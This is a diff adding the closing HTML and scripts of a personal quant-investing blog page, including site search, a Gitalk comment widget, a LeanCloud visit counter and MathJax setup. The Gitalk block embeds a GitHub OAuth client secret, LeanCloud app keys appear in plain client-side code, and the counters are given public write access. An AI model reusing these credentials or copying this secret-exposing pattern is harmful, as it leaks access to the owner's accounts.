+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+   
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/assets/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/assets/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  <script type="text/javascript" src="/assets/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/assets/js/src/post-details.js?v=5.1.1"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/assets/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var labels = ['gitalk','2019-01-16']
+</script>
+
+<script type="text/javascript">
+    labels.push('quant');
+</script>
+
+
+<script type="text/javascript">
+    labels.push('量化投资策略技术');
+</script>
+
+
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: 'dd688ffd2be8512fc659',
+        clientSecret: '483255bda7b80acb108df487ac91a0be78710b0d',
+        repo: '631068264.github.io',
+        owner: '631068264',
+        admin: ['631068264'],
+        id: '选股',
+        title: '选股',
+        labels: labels,
+        perPage: 50,
+        distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+</script>
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+    
+
+  
+
+
+
+
+
+
+
+  
+
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("MQfAJm2nTUDaT5bEuS8i4Ygm-gzGzoHsz", "m4tqv3N9AepVgTk0YfSNe9kz");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+  <!--custom css in _sass/_custom/custom.scss -->
+
+<script type="text/javascript">
+    // 黑幕提示语
+    $('span.heimu').attr('title', '你知道得太多了');
+</script>
+
+<script type="text/javascript">
+    // 多图显示 gp-列数
+    $('span[class^="gp-"]').each(function () {
+        var div_mulp = $(this);
+        if (div_mulp && div_mulp.attr('class')) {
+            var column_number = parseInt(div_mulp.attr('class').split('-')[1]);
+            var image = div_mulp.find('img');
+            if (image.size() > 0) {
+                div_mulp.removeClass()
+                    .addClass('post-gallery')
+                    .attr('itemscope', '')
+                    .attr('itemtype', 'http://schema.org/ImageGallery');
+
+                image.each(function (index) {
+                    var modulo = index % column_number;
+
+                    if (modulo === 0) {
+                        content = $('<div class="post-gallery-row"></div>')
+                    }
+                    var image_src = $(this).attr('src');
+                    content.append('<a class="post-gallery-img fancybox"\n' +
+                        '                 href="' + image_src + '" rel="gallery_"\n' +
+                        '                 itemscope itemtype="http://schema.org/ImageObject" itemprop="url">\n' +
+                        '                <img src="' + image_src + '" itemprop="contentUrl"/>\n' +
+                        '              </a>');
+
+                    if (modulo === column_number - 1) {
+                        div_mulp.append(content)
+                    }
+                });
+
+                var photo_size_modulo = image.size() % column_number;
+                if (photo_size_modulo > 0) {
+                    div_mulp.append(content);
+                }
+                image.remove();
+            }
+        }
+    });
+
+
+</script>
+</body>
+</html>
+
